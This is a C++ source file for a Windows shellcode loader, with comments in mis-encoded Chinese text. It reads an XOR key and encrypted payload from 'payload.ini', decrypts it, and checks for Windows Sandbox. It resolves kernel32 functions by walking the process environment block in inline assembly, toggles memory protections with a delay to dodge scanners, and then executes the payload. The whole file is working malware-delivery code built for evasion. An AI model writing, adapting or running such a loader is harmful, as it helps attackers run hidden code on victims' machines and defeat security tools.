#include <iostream>
#include <fstream>
#include <vector>
#include <iomanip>
#include <time.h>

#include "detect.h"

using namespace std;

bool readFile(const string& filename, vector<unsigned char>& key, vector<unsigned char>& encryptedData) {
    ifstream file(filename, ios::binary);
    if (!file.is_open()) {
        cerr << "�޷����ļ�: " << filename << endl;
        return false;
    }

    key.resize(16);
    file.read(reinterpret_cast<char*>(key.data()), 16);  
    encryptedData.assign((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    return true;
}



vector<unsigned char> xorDecrypt(const vector<unsigned char>& encryptedData, const vector<unsigned char>& key) {
    vector<unsigned char> decryptedData(encryptedData.size());
    size_t key_len = key.size();

    for (size_t i = 0; i < encryptedData.size(); ++i) {
        decryptedData[i] = encryptedData[i] ^ key[i % key_len]; 
    }

    return decryptedData;
}

void detect_sandbox()
{
    try {
        if (wsb_detect_username() || wsb_detect_proc() || wsb_detect_suffix() ||
            wsb_detect_dev() || wsb_detect_genuine() || wsb_detect_cmd() ||
            wsb_detect_time() || wsb_detect_state_dev()) {
            throw std::runtime_error("windows ɳ�䱻���");
        }
    }
    catch (const std::exception& e) {
        std::cerr << e.what() << std::endl;
    }
}

namespace getImportAddress {

    typedef FARPROC(WINAPI* pGetProcAddress)(
        _In_ HMODULE hModule,
        _In_ LPCSTR lpProcName
        );

    typedef BOOL(WINAPI* pVirtualProtect) (
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flNewProtect,
        PDWORD lpflOldProtect
        );

    typedef LPVOID(WINAPI* pVirtualAlloc)(
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flAllocationType,
        DWORD  flProtect
        );

    // 1. ��ȡkernel32�ĵ�ַ
    /*
        ���ʹ�õ��� ��Intel C++ ��������ע�͸ú���
        ���ϵͳ����ASLR��ע�͸ú���
        ����ʹ�����´����ȡkernel32�ĵ�ַ
    */
    DWORD GetKernel32Address() {
        DWORD dwKernel32Addr = 0;
        _asm {
            mov eax, fs: [0x30]
            mov eax, [eax + 0x0c]
            mov eax, [eax + 0x14]
            mov eax, [eax]
            mov eax, [eax]
            mov eax, [eax + 0x10]
            mov dwKernel32Addr, eax
        }
        return    dwKernel32Addr;
    }

    DWORD RGetProcAddress() {
        //��ȡkernel32�ĵ�ַ
        DWORD dwAddrBase = GetKernel32Address();
        //��ȡDosͷ
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dwAddrBase;
        //��ȡNtͷ Ntͷ=dll��ַ+Dosͷ
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos->e_lfanew + dwAddrBase);
        //����Ŀ¼��                            ��չͷ ����Ŀ¼�� + ������    ��λ������
        PIMAGE_DATA_DIRECTORY pDataDir = pNt->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;
        //������
        //�������ַ
        PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(dwAddrBase + pDataDir->VirtualAddress);
        //��������
        DWORD dwFunCount = pExport->NumberOfFunctions;
        //������������
        DWORD dwFunNameCount = pExport->NumberOfNames;
        //������ַ
        PDWORD pAddrOfFun = (PDWORD)(pExport->AddressOfFunctions + dwAddrBase);
        //�������Ƶ�ַ
        PDWORD pAddrOfNames = (PDWORD)(pExport->AddressOfNames + dwAddrBase);
        //��ű�
        PWORD pAddrOfOrdinals = (PWORD)(pExport->AddressOfNameOrdinals + dwAddrBase);
        //������������
        for (size_t i = 0; i < dwFunCount; i++)
        {
            //�жϺ�����ַ�Ƿ����
            if (!pAddrOfFun[i])
            {
                continue;
            }
            //ͨ��������ַ�����������Ƶ�ַ����ȡ��Ҫ�ĺ���
            DWORD dwFunAddrOffset = pAddrOfFun[i];
            for (size_t j = 0; j < dwFunNameCount; j++)
            {
                if (pAddrOfOrdinals[j] == i)
                {
                    DWORD dwNameOffset = pAddrOfNames[j];
                    char* pFunName = (char*)(dwAddrBase + dwNameOffset);
                    if (strcmp(pFunName, "GetProcAddress") == 0)
                    {
                        return dwFunAddrOffset + dwAddrBase;
                    }
                }
            }
        }
    }

    HMODULE gethKernal32() {
        //static HMODULE hKernel32 = (HMODULE)GetKernel32Address();
        static HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
        return hKernel32;
    }
    

    pVirtualAlloc getVirtualAlloc() {
           //static pVirtualAlloc funcVirtualAlloc = (pVirtualAlloc)((pGetProcAddress)RGetProcAddress())(gethKernal32(), "VirtualAlloc");
           static pVirtualAlloc funcVirtualAlloc = (pVirtualAlloc)GetProcAddress(gethKernal32(), "VirtualAlloc");
           return funcVirtualAlloc;
    }

    pVirtualProtect getVirtualProtect() {
        //static pVirtualProtect funcVirtualProtect = (pVirtualProtect)((pGetProcAddress)RGetProcAddress())(gethKernal32(), "VirtualProtect");
        static pVirtualProtect funcVirtualProtect = (pVirtualProtect)GetProcAddress(gethKernal32(), "VirtualProtect");
        return funcVirtualProtect;
    }

}

int intruder() {
    string filename = "payload.ini";
    vector<unsigned char> key, encryptedData;
    if (!readFile(filename, key, encryptedData)) {
        return 1;
    }
    vector<unsigned char> decryptedData = xorDecrypt(encryptedData, key);

    cout << "payload: ";
    for (unsigned char byte : decryptedData) {
        cout << hex <<std::setw(2)<<std::setfill('0')<< static_cast<int>(byte) << " ";
    }
    cout << endl;
    std::cout << "payload ��ʼִ��:" << std::endl;
    int a;
    auto b = (void(*)())(getImportAddress::getVirtualAlloc()(NULL, decryptedData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    memcpy(b, decryptedData.data(), decryptedData.size());
    DWORD oldProtect;
    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_EXECUTE_READ, &oldProtect));
    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_NOACCESS, &oldProtect));
    Sleep(5);
  
    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_EXECUTE_READ, &oldProtect));
    detect_sandbox();
    b();
    
    return 0;
}



int main()
{
    detect_sandbox();
    intruder();
    return 0;
}
